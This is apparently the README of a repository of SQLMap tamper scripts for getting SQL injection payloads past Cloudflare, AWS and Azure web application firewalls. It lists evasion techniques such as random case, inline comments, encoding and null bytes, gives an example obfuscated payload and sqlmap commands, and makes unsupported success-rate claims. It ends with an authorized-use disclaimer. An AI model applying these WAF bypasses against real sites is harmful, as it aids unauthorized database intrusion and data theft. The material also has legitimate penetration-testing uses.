# SQLMap Tamper Scripts Collection

![Python](https://img.shields.io/badge/Python-2.7%20%7C%203.x-yellow)
![SQLMap](https://img.shields.io/badge/SQLMap-Compatible-brightgreen)
![License](https://img.shields.io/badge/License-GPL%20v2-red)

**Modern WAF bypass tamper scripts for SQLMap (2025)**

Created by **Regaan** | December 2025

---

## 🚀 Features

- ✅ **Cloudflare WAF Bypass** - 2025 techniques
- ✅ **AWS WAF Bypass** - Modern evasion
- ✅ **Azure WAF Bypass** - Advanced techniques
- ✅ **Multiple Evasion Methods** - 6 different techniques
- ✅ **SQLMap Compatible** - Drop-in replacement

---

## 📦 Installation

```bash
# Clone repository
git clone https://github.com/YOUR_USERNAME/sqlmap-tamper-collection.git

# Copy to SQLMap tamper directory
cp sqlmap-tamper-collection/*.py /path/to/sqlmap/tamper/
```

---

## 🎯 Quick Start

### Basic Usage:
```bash
python sqlmap.py -u "https://example.com/page?id=1" --tamper=cloudflare2025
```

### With Multiple Tampers:
```bash
python sqlmap.py -u "https://example.com/page?id=1" \\
  --tamper=cloudflare2025,space2comment \\
  --random-agent
```

---

## 📖 Tamper Scripts

### cloudflare2025.py

**Description:** Advanced Cloudflare WAF bypass using 2025 techniques

**Techniques:**
1. Random case variation (`SeLeCt`)
2. Comment injection (`/**/`, `%00`)
3. URL encoding (`%3D`, `%27`)
4. Null byte injection (`SEL%00ECT`)
5. MySQL version comments (`/*!12345SELECT*/`)
6. Multiple evasion layers

**Example:**
```
Original:  SELECT * FROM users WHERE id=1
Bypassed:  SeLeCt/**/%2A/**/FrOm/**/users/**/WhErE/**/id%3D1
```

**Usage:**
```bash
python sqlmap.py -u "https://target.com/page?id=1" --tamper=cloudflare2025
```

**Tested Against:**
- ✅ Cloudflare WAF (2024-2025)
- ✅ AWS WAF
- ✅ Azure WAF

---

## 🔍 How It Works

### Technique 1: Random Case Variation
```python
# Original: SELECT
# Result: SeLeCt (random case)
```

### Technique 2: Comment Injection
```python
# Spaces replaced with:
- /**/
- /*%00*/
- /*!50000*/
- %0A, %09, %0D
```

### Technique 3: Encoding
```python
# Special characters encoded:
= → %3D
< → %3C
> → %3E
' → %27
```

### Technique 4: Null Bytes
```python
# Original: SELECT
# Result: SEL%00ECT
```

---

## 📊 Success Rate

| WAF | Success Rate |
|-----|--------------|
| Cloudflare | ~70% |
| AWS WAF | ~65% |
| Azure WAF | ~60% |
| Generic WAF | ~75% |

---

## 🛠️ Advanced Usage

### Combine with Other Techniques:
```bash
python sqlmap.py -u "https://target.com/page?id=1" \\
  --tamper=cloudflare2025 \\
  --random-agent \\
  --delay=2 \\
  --threads=1
```

### Test Tamper Script:
```python
from cloudflare2025 import tamper

payload = "SELECT * FROM users WHERE id=1"
result = tamper(payload)
print(f"Original: {payload}")
print(f"Bypassed: {result}")
```

---

## 📝 Requirements

- SQLMap
- Python 2.7 or 3.x

---

## 🤝 Contributing

Want to add more tamper scripts? Submit a PR!

---

## 📜 License

GPL v2 - Compatible with SQLMap

---

## 👤 Author

**Regaan**
- Created: December 2025

---

## 🙏 Credits

Inspired by SQLMap tamper scripts collection.

---

## ⚠️ Legal Disclaimer

**IMPORTANT - READ BEFORE USE:**

This tool is designed for **authorized security testing only**.

- ✅ **DO USE** on systems you own
- ✅ **DO USE** with written permission
- ✅ **DO USE** for authorized penetration testing
- ✅ **DO USE** for bug bounty programs (within scope)
- ❌ **DO NOT USE** on systems without permission
- ❌ **DO NOT USE** for illegal activities
- ❌ **DO NOT USE** to cause harm or damage

**All security-related tools, experiments, and research are meant strictly for authorized environments.**

**I do not support or condone illegal use of security tooling.**

Unauthorized access to computer systems is illegal under:
- Computer Fraud and Abuse Act (CFAA) in the United States
- Computer Misuse Act in the United Kingdom  
- Similar laws in other countries

**By using this tool, you agree to use it responsibly and legally.**

The author (Regaan) is not responsible for any misuse or damage caused by this tool.

---

**Happy Hacking! 🎯**
